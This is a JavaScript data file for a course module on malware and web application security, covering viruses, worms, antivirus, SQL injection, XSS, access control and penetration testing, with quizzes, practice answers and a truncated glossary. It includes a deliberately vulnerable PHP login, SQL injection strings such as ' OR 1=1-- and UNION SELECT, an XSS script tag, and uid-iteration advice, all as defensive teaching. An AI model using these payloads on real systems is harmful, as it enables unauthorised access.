COURSE.add({
n:5,
title:"Malware and Web Application Security",
blurb:"The malware families and how antivirus fights them, the common web application vulnerabilities and how to defend against them, and how penetration testing finds them first.",
topics:["Viruses, worms and trojans","Antivirus approaches","Tarpits and honeypots","SQL injection","Cross-site scripting","Broken access control and more","Penetration testing"],
labs:["malware","sqli","xss","pentest"],

parts:[
{tag:"A",title:"Malware overview",html:`
<p><strong>Malware</strong> is software designed to carry out malicious activity on an infected computer. It can encrypt your data and demand money to decrypt it (<strong>ransomware</strong>, e.g. WannaCry), or monitor data and send it to the attacker (<strong>spyware</strong>).</p>
${note("key","<strong>Zero-day</strong> malware (a zero-day exploit) uses a vulnerability that vendors have <strong>not yet patched</strong>, so attackers can exploit it before a fix exists. Antivirus that relies on known signatures cannot recognise it.")}
<p>Malware is classified into three main types, covered in the next parts:</p>
${tbl(["Type","Self-propagates?","In one line"],[
["Virus","Yes, needs a host","Attaches itself to a host file; needs the host to be run"],
["Worm","Yes, on its own","A standalone program that spreads across a network without user interaction"],
["Trojan","No","An innocuous-looking program hiding a virus or other damaging code"]
])}
`},

{tag:"B",title:"Viruses",html:`
<p>A <strong>computer virus</strong> is malicious executable code that <strong>self-propagates</strong>: it multiplies by attaching itself to a <strong>host document</strong>. The host can be an executable (.exe, a Unix shell script, a Windows batch file, a macro) or an office document such as a Word file or PDF. When the host is opened and the virus code runs, it attaches itself to more and more uninfected files. Its main aim is to infect as many hosts as possible. Normally the virus stops when the host stops, though some keep running in the background.</p>

<h3>B1. Checking and signatures</h3>
<p>Before copying into a host, a virus checks whether that file is <strong>already infected</strong>. If it didn't, it could attach repeatedly and the file would grow much larger, making the infection easy to spot. Once it copies in, it leaves a <strong>signature</strong> marking the file as infected (for example an impossible date).</p>

<h3>B2. Polymorphic (mutating) viruses</h3>
<p>When it attaches to a new host, the copy doesn't have to be identical. A <strong>polymorphic</strong> (mutating) virus changes itself as it spreads, often by encrypting parts of itself. If it stayed exactly the same it would be easy to spot, so mutating makes it <strong>harder to detect</strong>.</p>

<h3>B3. The three parts of a virus</h3>
${tbl(["Part","What it does"],[
["Concealment","Hides the virus from detection, e.g. from antivirus software"],
["Propagation","Finds files, infects them and adds a signature"],
["Payload","Any code not related to concealment or propagation, e.g. copying data and sending it to the attacker"]
])}

<h3>B4. Classifying by trigger</h3>
<p>The <strong>trigger</strong> is what makes the payload execute.</p>
${tbl(["Trigger","Meaning","Example"],[
["Logic bomb","Fires only when specified conditions are met","An employee who fears being fired adds code that checks for no account activity in 30 days, then starts deleting files"],
["Time bomb","Fires at a certain date or time","The Priscilla virus spread in an infected Word document; on 25 December it displayed a message, added coloured blocks and on reboot tried to reformat the hard drive"]
])}

<h3>B5. Classifying by infection mechanism</h3>
${tbl(["Mechanism","How it spreads"],[
["File infector","Embeds in an .exe and runs when the infected file is run"],
["Boot sector","Embeds in the boot sector of a disk; becomes memory-resident when booted from or the disk is read"],
["Email virus","Attached to an email"],
["Macro","Attached in a macro, e.g. in an Excel spreadsheet"],
["Operating system","Attaches itself to an operating system file"]
])}
${lab("malware")}
`},

{tag:"C",title:"Worms and trojans",html:`
<h3>C1. Worms</h3>
<p>Unlike viruses, <strong>worms don't need human interaction</strong> to spread. They exist as a <strong>separate program</strong> and use a network to send copies of themselves to other machines, by exploiting vulnerabilities in applications and protocols. They can consume bandwidth and let attackers access your machine remotely. Ways a worm spreads to another machine:</p>
<ul>
<li>Using Unix remote shell scripts like <strong>SSH</strong> to log into another machine.</li>
<li><strong>Cracking a password</strong> and logging in remotely as that user.</li>
<li>Through <strong>bugs in networking software</strong>.</li>
</ul>
${tbl(["Worm","What it did"],[
["Blaster","Spread across networks and forced computers to constantly reboot, eventually causing a DDoS on the Windows website"],
["Witty (2004)","Thought to be the first widely-propagated internet worm with a destructive payload; exploited a flaw in firewalls and repeatedly deleted sections of hard drives"],
["Morris","Caused impact by consuming resources, e.g. bringing down the network at MIT (a worm can be malware even with no damaging payload)"]
])}
${note("key","<strong>Why worms are more dangerous than viruses:</strong> because they self-propagate with no user interaction, they can spread far more easily and widely, so they have more potential for destruction. A worm can be classed as malware even if it carries no damaging payload, simply because it consumes resources.")}

<h3>C2. Trojans</h3>
<p><strong>Trojans</strong> do <strong>not</strong> try to propagate themselves. They are innocuous-looking programs that <strong>hide</strong> a virus or other damaging program, such as a key logger.</p>
<ul>
<li>A <strong>key logger</strong> is a type of <strong>spyware</strong>: it gathers information (every keystroke, including usernames and passwords) and sends it back to the attacker.</li>
<li>A trojan often includes a <strong>backdoor</strong>, letting attackers bypass normal authentication and gain remote control. This is a <strong>Remote Access Trojan (RAT)</strong>, which often includes code to hide its activity.</li>
</ul>
`},

{tag:"D",title:"Detection and prevention",html:`
<p>There are three general areas for preventing and detecting malware:</p>
<ul>
<li><strong>User awareness:</strong> avoid risky behaviour, e.g. not downloading questionable files.</li>
<li><strong>Technical solutions:</strong> write-protect sensitive parts of the disk, use intrusion detection/prevention systems and firewalls.</li>
<li><strong>Antivirus software:</strong> identifies and removes malware, and tries to stop infection in the first place.</li>
</ul>

<h3>D1. Antivirus approaches</h3>
${tbl(["Approach","How it works","Weakness"],[
["Virus dictionary","Searches every file for signatures of known viruses","Needs users to keep definitions up to date and scan regularly; can't recognise unknown (zero-day) viruses, and struggles with polymorphic viruses that change their signature"],
["Integrity checker","Identifies changes to files, e.g. an old file recently modified, and alerts the user","Can only find a virus after it has already done some damage; the virus still has to be identified and located. But it can catch the effects of a mutating virus"],
["Activity monitoring","Watches all programs for suspicious behaviour, e.g. writing executable code to another program, changing program length, slowing down","Identifies new viruses, but may flag many false positives"]
])}
${note("key","This answers a key exam question: <strong>why might a computer with a dictionary-based antivirus still get infected?</strong> It could be a zero-day virus with no signature yet, a polymorphic virus that changes its signature, or the user simply hasn't updated their signature database.")}

<h3>D2. Quarantine, sandboxes and containers</h3>
<p>In the activity-monitoring approach, a suspected file is <strong>quarantined</strong>: placed somewhere it can't affect the rest of the system, and the user decides whether to remove or restore it. Quarantine can use:</p>
<ul>
<li>A <strong>sandbox</strong> — an environment cordoned off from the main OS. Anything the sandboxed application creates or changes isn't accessible outside and isn't saved, so malware it installs disappears when the application stops.</li>
<li><strong>Containers</strong>, such as Docker.</li>
</ul>
`},

{tag:"E",title:"Minimising impact and staying informed",html:`
<h3>E1. Tarpits</h3>
<p>A <strong>tarpit</strong> is a security mechanism that <strong>purposefully delays</strong> network connections to a server. This helps against:</p>
<ul>
<li><strong>Worms:</strong> the ever-longer wait times to send packets to a new host slow the spread of infection.</li>
<li><strong>DoS:</strong> for an HTTP request flood, each request takes longer and longer to answer, slowing the attack. A genuine user barely notices, but the flood is held up.</li>
</ul>

<h3>E2. Honeypots</h3>
<p>A <strong>honeypot</strong> is an apparently legitimate computer set up to be <strong>enticing to attackers</strong> but holding no valuable information, for example a server that looks like it holds a customer database. Attackers attack it, and in the process you gather information about them.</p>

<h3>E3. Known-vulnerability databases</h3>
<p>Keep up to date with known vulnerabilities and attacks using these resources:</p>
${tbl(["Resource","What it is"],[
["CVE","Common Vulnerabilities and Exposures: numbered known vulnerabilities (cve.mitre.org)"],
["NVD","National Vulnerability Database, a US government source (nvd.nist.gov)"],
["CWE","Common Weakness Enumeration: community-driven database of common software and hardware weaknesses (cwe.mitre.org)"],
["MAEC","Malware Attribute Enumeration and Characterization: a structured language for sharing data on malware"],
["OWASP","Open Web Application Security Project, which publishes the OWASP Top 10 web application vulnerabilities (owasp.org)"]
])}
${note("tip","The OWASP Top 10 is the backdrop for Parts F to H: SQL injection, broken authentication, sensitive data exposure, XML external entities, broken access control, security misconfiguration, cross-site scripting, insecure deserialisation, using components with known vulnerabilities, and insufficient logging and monitoring.")}
`},

{tag:"F",title:"SQL injection",html:`
<p><strong>SQL injection</strong> results from <strong>untrusted user data being used as part of a query</strong>. The data tricks the server into executing commands or queries it shouldn't. The key is the quote: a <code>'</code> makes the interpreter switch context from a string <em>value</em> to a SQL <em>command</em>.</p>

<h3>F1. The vulnerable code</h3>
<p>A login query built by pasting the user's input straight into the string:</p>
${pre(`
$username = $_POST["login"];
$password = $_POST["password"];
$result = mysql_query("SELECT * from accounts WHERE
          username = '$username' AND password = '$password'");
if (mysql_num_rows($result) > 0) { echo "Success"; redirect(); }`)}
<p>The flawed logic: if <strong>any</strong> record is returned, the login succeeds.</p>

<h3>F2. The classic injections</h3>
${tbl(["Input","Resulting query (in effect)","Result"],[
["Username: <code>Fred' OR '1'='1</code>","… username = 'Fred' OR '1'='1' AND password = …","The OR is always true, so a row is returned whatever the name. With a common password you could get into an account (password spraying)."],
["Password: <code>value' OR '1'='1</code>","… username = 'Bob' AND password = 'value' OR '1'='1'","Get into a <em>specific</em> user's account without knowing their password."],
["Username: <code>' OR 1=1--</code>","… username = '' OR 1=1-- ' AND password = …","<code>--</code> comments out the rest of the line. Returns all rows, so a system that just checks for ≥ 1 result lets you in."]
])}
<p><strong>Batch and UNION:</strong> multiple statements can be separated by <code>;</code> or joined with <strong>UNION</strong>. If an attacker knows the columns, a <code>UNION SELECT</code> can pull out other data, e.g. usernames and passwords from a <code>users</code> table, or list every column with <code>SELECT * FROM INFORMATION_SCHEMA.COLUMNS;</code>.</p>
${lab("sqli")}

<h3>F3. Defences</h3>
${tbl(["Defence","How it works","Note"],[
["Escaping input","Escape characters tied to injection, e.g. in PHP \\ escapes the next character (escape ' \" ; --)","Weak: an attacker can add an extra \\ to escape the escape character, re-opening the hole"],
["Parameterised (prepared) queries","The query is written with a ? placeholder and the input is bound as data, server-side, so it can never become SQL","A strong defence"],
["Stored procedures","The query is stored in the database and parameters are bound to it","Strong, as long as the procedure doesn't build dynamic SQL inside"],
["Reduce user input","e.g. use a date picker instead of a free-text field","Insufficient alone, but shrinks the attack surface"]
])}
${note("key","<strong>Parameterised queries vs stored procedures:</strong> both use bound parameters rather than building commands from user input. Parameterised queries run server-side in your code (e.g. PHP/Java); stored procedures live in the database. Either is the best mitigation because the user input is never issued directly to the database as command text.")}
`},

{tag:"G",title:"Cross-site scripting (XSS)",html:`
<p><strong>Cross-site scripting</strong> is when attackers inject <strong>client-side script</strong> into web pages that are shown to other users. Those users' browsers then run the malicious code. It happens when user input is taken and later displayed to others without being sanitised.</p>

<h3>G1. Stored vs reflected</h3>
${tbl(["Type","Where the script lives"],[
["Stored XSS","The malicious input is stored on the target server (e.g. in a comments field) and served to everyone who views the page"],
["Reflected XSS","The malicious script is attached to the end of a URL and reflected back in the response"]
])}

<h3>G2. What it can do</h3>
<p>An injected script such as <code>&lt;script&gt;…&lt;/script&gt;</code> runs with the page's privileges, so it could:</p>
<ul>
<li>access cookies, session tokens or other sensitive information the browser holds for that site,</li>
<li>deface the website,</li>
<li>redirect the user to a malicious site (e.g. <code>window.open(...)</code>), and more.</li>
</ul>
${lab("xss")}

<h3>G3. Defence</h3>
<ul>
<li><strong>Input validation:</strong> limit untrusted input, e.g. reject <code>&lt;script&gt;</code>.</li>
<li><strong>HTML encoding before inserting untrusted data:</strong> e.g. replace <code>&lt;</code> with <code>&amp;lt;</code> so the browser shows it as text instead of running it. Use HTML "slots" for untrusted data.</li>
</ul>
`},

{tag:"H",title:"More web application vulnerabilities",html:`
<p>The rest of the OWASP themes from your slides.</p>

<h3>H1. Broken authentication</h3>
<p>Errors in how authentication is implemented, e.g. session timeout or password management. Defences: use existing well-tested libraries and frameworks, implement weak-password checking, harden password recovery, and use multi-factor authentication.</p>

<h3>H2. Sensitive data exposure</h3>
<p>Attacks like SQL injection, packet sniffing or MITM can expose sensitive data. Mitigate by <strong>encrypting or hashing</strong> sensitive data appropriately, and by <strong>not storing what you don't need</strong>.</p>

<h3>H3. Broken access control</h3>
${tbl(["Flaw","What it is","Example / fix"],[
["Insecure Direct Object Reference (IDOR)","A user-supplied identifier is used to fetch an object with no authorisation check","MyAccount.php?uid=1241126841 — change the uid to another value and see someone else's data. Fix: check the logged-in user is authorised for that object."],
["Debug mode left on","Developers forget to switch off debugging after deploying","sensitiveInfo.php?debug=true can reveal information you shouldn't see"],
["Missing function-level access control","A request for functionality is fulfilled without checking the user is authorised","example.com/specialFunction.php reached directly. Fix: don't show functions users can't use, and check authorisation before providing any functionality"]
])}

<h3>H4. Other issues</h3>
${tbl(["Vulnerability","Defence"],[
["XML External Entities (XXE): an XML processor evaluates a malicious external entity (URI), causing remote requests, DoS or scanning","Use JSON or something simpler, patch old XML processors, disable external-entity processing"],
["Security misconfiguration: default usernames/passwords, missing patches, misconfigured firewalls","Run scans and audits, have processes to keep software up to date, don't use default settings"],
["Insecure deserialisation: an attacker supplies a malicious serialised object (e.g. editing a serialised record to make themselves admin)","Check integrity of serialised objects (e.g. digital signatures), deserialise in a low-privilege environment, log failures (see CVE-2017-9805)"],
["Using components with known vulnerabilities: components often run with full privileges","Keep components up to date; research a component's security before using it"],
["Insufficient logging and monitoring: attacks go undetected","Better logging/monitoring processes and policies; tools such as an IDS"]
])}
`},

{tag:"I",title:"Penetration testing",html:`
<p><strong>Ethical hacking</strong> is a legal, authorised attempt to exploit systems to improve security by finding vulnerabilities through direct attacks. It requires <strong>clear contracts signed by all parties</strong> to set the scope and limits of the exercise.</p>
<p><strong>Penetration testing</strong> uses a structured framework (such as the Web Security Testing Guide, WSTG). Whatever the framework, there are key phases:</p>
${tbl(["Phase","What happens"],[
["Reconnaissance","Information gathering. Passive (public websites, social media, a site's code via developer tools) or active (probing directly with pings to find open ports, or using the system as a normal customer). Goal: understand the target's structure, technologies and potential vulnerabilities."],
["Scanning","Use tools to identify live hosts, open ports, services and vulnerabilities. Includes network mapping (finding devices and the network structure), supported by tools such as Nmap (Week 4)."],
["Exploitation","Attempt to exploit the vulnerabilities found to gain unauthorised access, e.g. through SQL injection. Goal: demonstrate the effect, such as reaching sensitive customer data."],
["Post-exploitation","Understand the impact of a successful attack: escalate privileges, collect more data, establish persistent access, explore lateral movement to other systems. Shows how much damage a real attacker could do, and informs mitigations. All actions are documented."],
["Reporting","Summarise the findings. Often the main deliverable, so it must be well organised, clear and evidence-based."]
])}

<h3>I1. The report</h3>
<p>A penetration testing report usually includes:</p>
<ol>
<li>An <strong>executive summary</strong> for non-technical stakeholders, giving key findings and business impact in plain language.</li>
<li>A <strong>detailed technical report</strong> explaining the vulnerabilities, how they were exploited and discovered, proposed mitigations, and supporting logs for deeper review.</li>
</ol>
${note("rem","Communication skills matter as much as the technical ones. If you can't clearly explain the issue, why it happens and how to fix it, the point of the whole exercise is lost.")}
`}
],

quiz:[
{q:"What is the main difference between a virus and a worm?",o:["A virus needs human interaction to propagate; a worm self-propagates without it","A worm needs a host file; a virus doesn't","A virus is hardware; a worm is software","There is no difference"],a:0,why:"A worm spreads across a network on its own, while a virus needs its host to be opened or run."},
{q:"Why are worms potentially more dangerous than viruses?",o:["They self-propagate with no user interaction, so they spread more easily and widely","They are always encrypted","They only run once","They can't be detected at all"],a:0,why:"Spreading without user interaction gives worms far more potential to propagate, and so more potential for destruction."},
{q:"Why can a worm that causes no direct damage still be classed as malware? Give an example.",o:["It consumes resources, e.g. the Morris worm brought down the network at MIT","It changes the desktop wallpaper","It is signed by a CA","It only affects printers"],a:0,why:"Even with no destructive payload, consuming bandwidth and resources is harmful. The Morris worm is the classic example."},
{q:"What is a zero-day exploit?",o:["Malware that exploits a vulnerability not yet patched by the vendor","A virus that deletes itself after zero days","Any virus older than a year","A worm that needs a password"],a:0,why:"Zero-day means there is no patch yet, so a signature-based antivirus has nothing to match."},
{q:"What are the three parts of a virus?",o:["Concealment, propagation and payload","Header, payload and footer","Encrypt, decrypt and sign","Scan, exploit and report"],a:0,why:"Concealment hides it, propagation spreads it and adds a signature, and the payload is everything else."},
{q:"Why does a virus leave a signature in a file it infects?",o:["So it can tell the file is already infected and avoid re-infecting it","To tell the antivirus it is there","To encrypt the file","To delete the file later"],a:0,why:"Without the check, repeated infection would grow the file and make the infection easy to spot."},
{q:"What is a polymorphic virus?",o:["One that mutates (often by encrypting parts of itself) as it spreads, to avoid detection","One that only infects polymorphic files","One that needs two hosts","One that can't replicate"],a:0,why:"Changing its own code each time means it doesn't match a fixed signature, making it harder to detect."},
{q:"A logic bomb triggers its payload when…",o:["Specified conditions are met, e.g. no account activity for 30 days","A certain date or time is reached","The computer is rebooted","An email is opened"],a:0,why:"A logic bomb fires on a condition; a time bomb fires at a date or time."},
{q:"Which infection mechanism embeds a virus in the small part of a disk read at startup?",o:["Boot sector","File infector","Macro","Email virus"],a:0,why:"A boot-sector virus becomes memory-resident when the machine boots from, or reads, the disk."},
{q:"How does a worm typically spread to another machine?",o:["By exploiting vulnerabilities, cracking a password, or using SSH to log in remotely","By waiting for the user to open an attachment","By being signed with a certificate","By editing the boot sector only"],a:0,why:"Worms use the network: bugs in networking software, cracked passwords, or remote shells like SSH."},
{q:"What is a trojan?",o:["An innocuous-looking program that hides a virus or other damaging code","A self-propagating network program","A type of firewall","A kind of digital certificate"],a:0,why:"A trojan doesn't propagate itself; it hides malicious code inside something that looks harmless."},
{q:"A key logger is an example of what, and what does it do?",o:["Spyware that records keystrokes and sends them to the attacker","A worm that reboots the machine","A tarpit that slows connections","An integrity checker"],a:0,why:"A key logger is spyware: it gathers information (every keystroke, including passwords) and sends it back."},
{q:"What does a Remote Access Trojan (RAT) give an attacker?",o:["A backdoor to bypass authentication and remotely control the computer","A faster internet connection","A valid TLS certificate","A list of open ports"],a:0,why:"A RAT's backdoor bypasses normal security and gives remote control, often hiding its own activity."},
{q:"How does a virus-dictionary antivirus detect malware?",o:["It searches files for signatures of known viruses","It watches program behaviour","It delays network connections","It encrypts suspicious files"],a:0,why:"The dictionary approach matches files against a database of known virus signatures."},
{q:"Why might a computer with a dictionary-based antivirus still get infected?",o:["A zero-day or polymorphic virus, or out-of-date signatures","The firewall is too strong","The CPU is too fast","The antivirus is signed"],a:0,why:"A zero-day has no signature yet, a polymorphic virus changes its signature, and stale definitions miss new threats."},
{q:"What is the main downside of an integrity-checker antivirus?",o:["It only finds a virus after it has already done some damage","It can't detect mutating viruses","It needs the internet","It encrypts the whole disk"],a:0,why:"It spots changes after the fact; the upside is it can catch the effects of a mutating virus."},
{q:"What is the benefit, and the drawback, of activity-monitoring antivirus?",o:["It can identify new viruses, but may flag many false positives","It never raises false alarms, but misses new viruses","It is free, but slow","It needs no updates, but can't quarantine"],a:0,why:"Watching behaviour catches novel malware, at the cost of false positives."},
{q:"What is a sandbox used for in malware defence?",o:["Running a suspect program in isolation so its changes aren't saved or able to affect the system","Permanently deleting any suspicious file","Speeding up the antivirus scan","Encrypting network traffic"],a:0,why:"A sandbox is cordoned off from the OS, so anything the application creates or changes vanishes when it stops."},
{q:"What does a tarpit do, and how does it help against a worm?",o:["It purposefully delays connections, so ever-longer waits slow the worm's spread","It blocks the worm's IP permanently","It deletes the worm's payload","It encrypts the worm"],a:0,why:"The growing delays slow propagation to new hosts, and for an HTTP flood each request takes longer to answer."},
{q:"What is a honeypot?",o:["A decoy computer with no valuable data, set up to attract attackers and gather information on them","A backup server for sensitive data","A type of firewall rule","A password manager"],a:0,why:"Attackers attack the enticing-but-worthless honeypot, revealing information about themselves."},
{q:"What does the CVE database contain?",o:["Numbered known cyber security vulnerabilities","Only malware samples","A list of antivirus products","Firewall rule templates"],a:0,why:"CVE is Common Vulnerabilities and Exposures: numbered, known vulnerabilities."},
{q:"What does a SQL injection attack exploit?",o:["Unsanitised user input used directly in a database query","A weak encryption key","An expired certificate","An open port"],a:0,why:"User input is placed straight into the query, so it can change the query's meaning."},
{q:"In SQL injection, why is the single quote <code>'</code> so important?",o:["It makes the interpreter switch from a string value to a SQL command","It encrypts the password","It comments out the query","It escapes the username"],a:0,why:"The quote closes the string literal, letting the attacker's text be read as SQL."},
{q:"What could entering <code>' OR 1=1--</code> in a username field achieve?",o:["Return all rows and comment out the rest, logging you in if the system just checks for any result","Delete the accounts table","Encrypt the database","Crash the web server"],a:0,why:"OR 1=1 is always true and -- comments out the password check, so a ≥ 1-result login succeeds."},
{q:"Tom uses SQL injection to get into his manager Ruby's account. What kind of attack is this?",o:["Vertical privilege escalation (and an example of spoofing)","Horizontal data loss","A denial of service","A replay attack"],a:0,why:"Gaining a higher-privileged account is vertical privilege escalation; impersonating Ruby is spoofing."},
{q:"Which is the strongest defence against SQL injection?",o:["Parameterised queries or stored procedures, which bind input as data","Escaping the quote character only","Hiding the login page","Using a longer password"],a:0,why:"Binding input as parameters means it can never be issued to the database as command text."},
{q:"What is the difference between parameterised queries and stored procedures?",o:["Parameterised queries run server-side in your code; stored procedures live in the database","Stored procedures don't use parameters","Parameterised queries can't prevent injection","They are the same thing"],a:0,why:"Both bind parameters; the difference is where they run. Stored procedures are safe as long as they don't build dynamic SQL inside."},
{q:"Why is escaping input a weak defence against SQL injection on its own?",o:["An attacker can add an extra backslash to escape the escape character, re-opening the hole","Escaping deletes the database","Escaping only works on numbers","Escaping slows the server down"],a:0,why:"If ' and -- are escaped, an added \\ escapes the escape character, so the injection works again."},
{q:"What is cross-site scripting (XSS)?",o:["Injecting client-side script into pages that are shown to other users, so it runs in their browsers","Reading a database without a password","Flooding a server with pings","Encrypting a victim's files"],a:0,why:"XSS runs attacker script in other users' browsers with the site's privileges."},
{q:"What is the difference between stored and reflected XSS?",o:["Stored XSS is saved on the server; reflected XSS is attached to a URL and bounced back","Stored XSS needs a password; reflected doesn't","Reflected XSS is always harmless","They target different databases"],a:0,why:"Stored XSS persists on the server and hits every viewer; reflected XSS rides in a crafted URL."},
{q:"What is the main defence against XSS?",o:["Input validation and HTML-encoding untrusted data before displaying it","Using a longer database password","Blocking port 80","Encrypting the hard drive"],a:0,why:"Encoding (e.g. < becomes &lt;) makes the browser show the script as text instead of running it."},
{q:"An Insecure Direct Object Reference (IDOR) is when…",o:["A user-supplied identifier fetches an object with no authorisation check","A password is sent in plaintext","A certificate is self-signed","A port is left open"],a:0,why:"Changing a parameter like uid=1254 to another value returns another user's data when there's no access check."},
{q:"Missing function-level access control means…",o:["A request for functionality is fulfilled without checking the user is authorised","The login page is missing","The firewall has no default rule","The database has no password"],a:0,why:"Reaching e.g. specialFunction.php directly, with no authorisation check, exposes functions the user shouldn't have."},
{q:"What is insecure deserialisation?",o:["An attacker supplies a malicious serialised object, e.g. editing a record to make themselves admin","Storing passwords in plaintext","Leaving debug mode on","Using an expired certificate"],a:0,why:"If serialised objects aren't integrity-checked, an attacker can tamper with them (e.g. change 'user' to 'admin') or inject code."},
{q:"What does ethical hacking require before it begins?",o:["Clear contracts signed by all parties defining scope and limits","A zero-day exploit","A botnet","The target's password"],a:0,why:"Ethical hacking is legal and authorised, so the scope and limitations must be agreed and signed."},
{q:"What are the main phases of a penetration test, in order?",o:["Reconnaissance, scanning, exploitation, post-exploitation, reporting","Reporting, scanning, reconnaissance, exploitation","Exploitation, reconnaissance, scanning, reporting","Scanning, reporting, exploitation, reconnaissance"],a:0,why:"You gather information, scan, exploit, assess impact after access, then report."},
{q:"In penetration testing, what is the difference between passive and active reconnaissance?",o:["Passive uses public info without touching the target; active probes the system directly","Passive is illegal; active is legal","Passive uses Nmap; active uses Google","There is no difference"],a:0,why:"Passive recon reviews public websites and code; active recon pings and probes the system itself."},
{q:"What happens in the post-exploitation phase?",o:["Assessing impact: escalating privileges, collecting data, persistence and lateral movement, all documented","Writing the executive summary","Asking the client for payment","Installing antivirus"],a:0,why:"Post-exploitation shows how much damage a real attacker could do, informing the mitigations in the report."},
{q:"Why is the report often the most important part of a penetration test?",o:["It is the main deliverable, so findings and fixes must be communicated clearly to be acted on","It is the only legal part","It replaces the contract","It contains the exploit code to reuse"],a:0,why:"If the issues, causes and fixes aren't explained clearly, the point of the test is lost, so communication matters as much as the hacking."}
],

practice:[
{q:"<strong>Virus vs worm.</strong> What is the difference between a virus and a worm?",a:"A virus needs human interaction to propagate; a worm is self-propagating and doesn't need user interaction."},
{q:"<strong>Danger.</strong> Why are worms potentially more dangerous than viruses?",a:"Because they self-propagate with no user interaction, they can spread more easily and widely, so there is more potential for destruction."},
{q:"<strong>Harmless worms.</strong> Some worms cause no damage on the computers they hit, so why are they malware? Give an example.",a:"They still have an impact by consuming resources. For example, the Morris worm brought down the network at MIT."},
{q:"<strong>Disguise.</strong> Describe two techniques that could help disguise a virus from antivirus software.",a:"Polymorphic viruses (which use encryption to change their signature), and zero-day exploits (no signature exists yet)."},
{q:"<strong>Dictionary AV.</strong> A dictionary-based antivirus recognises all known virus signatures. Why might the computer still be infected?",a:"It could be a zero-day virus with no signature yet, a polymorphic virus that changes its signature, or the user hasn't updated their virus-signature database."},
{q:"<strong>Scenario (USB).</strong> John keeps re-infecting his office PC from a game on an infected USB his wife brings from college. What should the company do to stop this recurring?",a:"Options include stopping external media being brought in, write-protecting sensitive parts of the hard disk, or running all external media in sandboxes. A strong answer gives a specific measure that would make this exact situation impossible, with reasoning."},
{q:"<strong>Scenario (risk evaluation).</strong> A department stores unpublished research on shared servers, some unpatched for months due to legacy software. Give a threat, vulnerability, likelihood, impact and a mitigation.",a:"Threat: ransomware or similar malware. Vulnerability: lack of regular updates/patching. Likelihood: high (attackers scan for old software, especially in public services, e.g. NHS and University of the West of Scotland ransomware attacks). Impact: high (research funds universities; losing access or the IP is substantial). So high impact, high risk, to prioritise. Mitigations: a patching policy and procedure with regular review, plus regular encrypted backups stored offsite."},
{q:"<strong>SQL injection target.</strong> What does a SQL injection attack exploit, and name two places you could use one.",a:"It exploits unsanitised user input used directly in a query. Any user-input field: e.g. a username/password field, a search field, or a comments field."},
{q:"<strong>' OR 1=1.</strong> What could entering <code>' OR 1=1</code> in a username field potentially achieve?",a:"It makes the username condition evaluate to true, so with a common password it could let you into an account (password spraying)."},
{q:"<strong>Privilege escalation.</strong> Tom uses SQL injection to get into the account of his manager Ruby. What kind of attack is this?",a:"Vertical privilege escalation (and also an example of spoofing)."},
{q:"<strong>Login code.</strong> The login SQL is built by concatenating the username and hashed password. What attack is it vulnerable to, what input exploits it, and how do you fix it?",a:"SQL injection, because user input isn't validated or sanitised. Input such as <code>' OR 1=1--</code> as the username makes the condition always true and comments out the rest. Fix: use parameterised queries, and/or escape meta-characters like ' ; --."},
{q:"<strong>Comments code.</strong> A comment is taken from the user and stored in the DB to be shown to others. What attack is this vulnerable to, what input exploits it, and how do you fix it?",a:"Cross-site scripting, because user input is stored and later displayed to users. Input such as <code>&lt;script&gt; window.open('http://unsafe') &lt;/script&gt;</code>. Fix: HTML-escape user-provided text (e.g. < to &lt;) and use HTML slots for untrusted data."},
{q:"<strong>Video URL.</strong> A page shows a video via <code>videos.jsp?vidNumber=5</code>, using the parameter directly. What is the vulnerability and how do you fix it?",a:"Insecure direct object reference (change vidNum) and missing function-level access control: someone who finds the URL can access videos they haven't paid for. Fix: check the user is authorised (has paid) for that video before displaying it, otherwise redirect."},
{q:"<strong>Stored procedures vs parameterised queries.</strong> How do they differ as SQL injection defences?",a:"Both bind parameters rather than building commands from user input. Parameterised queries run server-side in your code (e.g. PHP); stored procedures are stored in the database. As long as a stored procedure doesn't build dynamic SQL inside, both mitigate injection."},
{q:"<strong>uid parameter.</strong> After logging in you are sent to <code>MyAccount.php?uid=1241126841</code>. How can you test whether this parameter is used to enforce access control unsafely?",a:"(a) Change the uid to a different value of the same form; if your own details still return, it's probably not vulnerable. (b) Get another account's uid and substitute it in your own session; if their data shows, it's likely vulnerable. (c) Script iterating uid values up and down to see if other users' details return."},
{q:"<strong>IP-based access control.</strong> A web app enforces access control by the user's source IP. Why is this flawed?",a:"IP addresses can be spoofed (though it may be hard in practice), and more importantly different users can share the same IP behind a common proxy or firewall."},
{q:"<strong>Weak passwords.</strong> What password checking helps stop users picking weak passwords?",a:"Block common passwords, very short passwords, and passwords only slightly amended from previous ones. Long passphrases are generally better than forced complexity, which hurts memorability; see NCSC guidance."},
{q:"<strong>Antivirus approaches.</strong> Name the three antivirus approaches and one weakness of each.",a:"Dictionary (misses zero-day and polymorphic viruses, needs updating); integrity checker (only finds a virus after damage is done); activity monitoring (many false positives)."},
{q:"<strong>Tarpits and honeypots.</strong> What is a tarpit and what is a honeypot?",a:"A tarpit purposefully delays network connections, slowing worms and HTTP floods with little effect on genuine users. A honeypot is a decoy computer with no valuable data, set up to attract attackers so information can be gathered on them."},
{q:"<strong>Pen test phases.</strong> Name the penetration testing phases and what the report should contain.",a:"Reconnaissance, scanning, exploitation, post-exploitation, reporting. The report should contain an executive summary for non-technical stakeholders and a detailed technical report of the vulnerabilities, how they were exploited and discovered, and proposed mitigations with supporting logs."},
{q:"<strong>Ethical hacking.</strong> What makes hacking 'ethical', and why do communication skills matter?",a:"It is legal and authorised, with clear contracts signed by all parties defining scope and limits. Communication matters because if you can't clearly explain the issue, why it occurs and how to mitigate it, the intended outcome of the test may not be achieved."}
],

glossary:[
["Malware","Software designed to carry out malicious activity on a computer"],
["Virus","Malicious code that self-propagates by attaching to a host file"],
["Worm","A standalone program that spreads across a network without user interaction"],
["Trojan","An innocuous-looking program that hides a virus or other damaging code"],
["Ransomware","Malware that encrypts data and demands payment to decrypt it"],
["Spyware","Malware that gathers information and sends it to the attacker"],
["Zero-day","Malware exploiting a vulnerability not yet patched by the vendor"],
["Polymorphic virus","A virus that mutates, often by encryption, to avoid signature detection"],
["Payload","The part of a virus not related to concealment or propagation"],
["Logic bomb","A trigger that fires when specified conditions are met"],
["Time bomb","A trigger that fires at a certain date or time"],
["Key logger","Spyware that records keystrokes and sends them to the attacker"],
["Backdoor","A way to bypass normal authentication and gain remote control"],
["RAT","Remote Access Trojan: a trojan that gives remote control via a backdoor"],
["Virus dictionary","Antivirus that matches files against known virus signatures"],
["Integrity checker","Antivirus that detects changes to files after the fact"],
["Activity monitoring","Antivirus that watches programs for suspicious behaviour"],
